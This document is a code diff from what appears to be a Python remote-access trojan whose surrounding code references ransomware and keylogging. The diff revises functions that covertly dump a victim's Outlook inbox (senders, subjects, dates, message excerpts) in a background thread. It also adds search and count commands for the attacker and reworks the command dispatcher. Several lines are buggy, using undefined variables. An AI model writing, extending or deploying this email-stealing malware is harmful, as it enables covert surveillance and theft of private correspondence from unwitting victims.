@@ -670,36 +670,68 @@ class Client(object):
             self.debug("{} error: {}".format(self._ransom_wallet_address.func_name, str(e)))
 
 
-    def _email_dump(self, *args, **kwargs):
-        CoInitialize()
-        outlook = win32com.client.Dispatch("Outlook.Application").GetNameSpace('MAPI')
-        inbox   = outlook.GetDefaultFolder(6)
-        emails  = inbox.Items
-        n       = len(emails) if not Client._debug else 10
-        i       = 0
-        while i < n:
-            try:
-                email    = emails.GetNext()
-                sender   = email.SenderEmailAddress.encode('ascii','ignore')
-                message  = email.Body.encode('ascii','ignore')[:150] + '...'
-                subject  = email.Subject.encode('ascii','ignore')
-                received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
-                result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
-                self.email.inbox[i] = result
-                i += 1
-                if i >= n:
+    def _email_dump(self, n=None, **kwargs):
+        try:
+            CoInitialize()
+            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            inbox   = outlook.GetDefaultFolder(6)
+            emails  = inbox.Items
+            if not n:
+                n = len(emails)
+            elif str(n).isdigit():
+                n = int(n)
+            else:
+                n = len(emails)
+            i       = 1
+            while i < n:
+                try:
+                    email    = emails.GetNext()
+                    sender   = email.SenderEmailAddress.encode('ascii','ignore')
+                    message  = email.Body.encode('ascii','ignore')[:100] + '...'
+                    subject  = email.Subject.encode('ascii','ignore')
+                    received = str(email.ReceivedTime).replace('/','-').replace('\\','')
+                    result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
+                    self.email.inbox[i] = result
+                    i += 1
+                    if i > n:
+                        break
+                except Exception as e1:
+                    self.debug("{} error: {}".format(self._email_dump.func_name, str(e1)))
                     break
-            except Exception as e:
-                self.debug("{} error: {}".format(self._email_dump.func_name, str(e)))
-                break
+        except Exception as e2:
+            self.debug("{} error: {}".format(self._email_dump.func_name, str(e2)))
 
 
     def _email_read(self, *args, **kwargs):
         try:
-            max_len  = "{:<%d}" % int(max([len(str(i)) for i in self.email.inbox.keys()]) + 2)
-            return json.dumps({max_len.format(k): v for k,v in self.email.inbox.items()},  indent=2)
+            output   = OrderedDict()
+            for k,v in self.email.inbox.items():
+                output[str(k)] = v
+                if len(json.dumps(output)) > 2000:
+                    return json.dumps(output, sort_keys=True, indent=2) + '\ncontinued...'
+            return json.dumps(output, indent=2) if len(output) else "Outlook inbox must be dumped before emails are readable".format(string)
         except Exception as e:
             self.debug("{} error: {}".format(self._email_read.func_name, str(e)))
+
+
+    def _email_search(self, string):
+        try:
+            output   = OrderedDict()
+            for k,v in self.email.inbox.items():
+                if string in v.get('message') or string in v.get('subject') or string in v.get('from') or string in v.get('date'):
+                    output[str(k)] = v
+                    if len(json.dumps(output)) > 2000:
+                        return json.dumps(output, sort_keys=True, indent=2) + '\ncontinued...'
+            return json.dumps(output, indent=2) if len(output) else "'{}' not found".format(string)
+        except Exception as e:
+            self.debug("{} error: {}".format(self._email_search.func_name, str(e)))
+
+
+    def _email_emails(self):
+        try:
+            return "\n\t%d emails in Outlook inbox\n\t%d emails dumped" % (len(inbox), len(self.email.inbox))
+        except Exception as e:
+            self.debug("{} error: {}".format(self._email_search.func_name, str(e)))
 
 
     def _keylogger(self, *args, **kwargs):
@@ -1973,23 +2005,27 @@ class Client(object):
         """
         access user's Outlook email in the background
         """       
-        try:
-            if not args:
-                self._jobs[self._email_dump.func_name] = threading.Thread(target=self._email_dump, name=time.time())
-                self._jobs[self._email_dump.func_name].daemon = True
-                self._jobs[self._email_dump.func_name].start()
-                return "Dumping Outlook inbox"
-            else:
-                try:
-                    mode, _, arg   = str(args).partition(' ')
-                    if hasattr(self, '_email_%s' % mode):
-                        return getattr(self, '_email_%s' % mode)(arg) if arg else getattr(self, '_email_%s' % mode)()
-                    else:
-                        return "{} error: invalid option '{}'\nemail options: read, search".format(self.email.func_name, mode)
-                except Exception as e:
-                    return "{} error: {}".format(self.email.func_name, str(e))
-        except:
+        if not args:
+            try:
+                installed = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+                return "Outlook is installed on this host"
+            except: pass
             return "Outlook not installed on this host"
+        else:
+            try:
+                mode, _, arg   = str(args).partition(' ')
+                if hasattr(self, '_email_%s' % mode):
+                    if 'dump' in mode:
+                        self._jobs[self._email_dump.func_name] = threading.Thread(target=self._email_dump, kwargs={'n': arg}, name=time.time())
+                        self._jobs[self._email_dump.func_name].daemon = True
+                        self._jobs[self._email_dump.func_name].start()
+                        return "Dumping emails from Outlook inbox"
+                    else:
+                        return getattr(self, '_email_%s' % mode)(arg)
+                else:
+                    return "usage: email <dump/read> [#]"
+            except Exception as e:
+                return "{} error: {}".format(self.email.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <mode> [path]')
